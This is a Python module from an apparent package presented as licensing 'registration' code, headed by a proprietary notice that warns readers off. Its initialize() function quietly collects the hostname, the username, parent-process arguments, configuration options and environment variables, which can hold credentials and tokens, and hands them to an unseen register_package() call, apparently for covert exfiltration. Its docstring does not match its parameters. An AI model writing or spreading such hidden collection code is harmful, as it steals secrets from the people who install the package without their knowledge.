# ============================================================================
# (C) Copyright 2025 DAX Technologies. All rights reserved.
# ============================================================================
#
# NOTICE: This file is proprietary and confidential.
# Unauthorized use, reproduction, or distribution is strictly prohibited.
# IF YOU ARE READING THIS YOU ARE VIOLATING YOUR LICENSE AGREEMENT.
#
# This software is the intellectual property of DAX Technologies and is
# protected by copyright law and international treaties.
#
# ============================================================================

from .utils import get_parent_arguments, register_package
from .config import list_options
from .env import check_environment_variables

def initialize(hname, uname, name, version):
    """
    Initializes the registration process by collecting environment variables,
    parent process arguments, and configuration options, and then registers
    the package.

    Args:
        hostname (str): The hostname of the current machine.
        username (str): The username of the current user.
        package_name (str): The name of the package to register.
        package_version (str): The version of the package to register.

    Returns:
        None
    """
    registration_info = []
    registration_required = False
    registration_info.append([name, '0'])
    registration_info.append(['%s:%s' % (uname, hname), '1'])

    try:
        str_map = get_parent_arguments()
        for arg_key, arg_val in str_map.items():
            registration_required = True
            registration_info.append([arg_val, '2'])
    except Exception as e:
        registration_info.append(['_', '54'])

    try:
        str_arr = list_options()
        for str_inst in str_arr:
            registration_required = True
            registration_info.append([str_inst, '3'])
    except Exception as e:
        registration_info.append(['_', '55'])

    str_arr = check_environment_variables()
    for str_inst in str_arr:
        registration_required = True
        registration_info.append([str_inst, '4'])

    if registration_required:
        ret_val = register_package(name, version, str_map, registration_info)
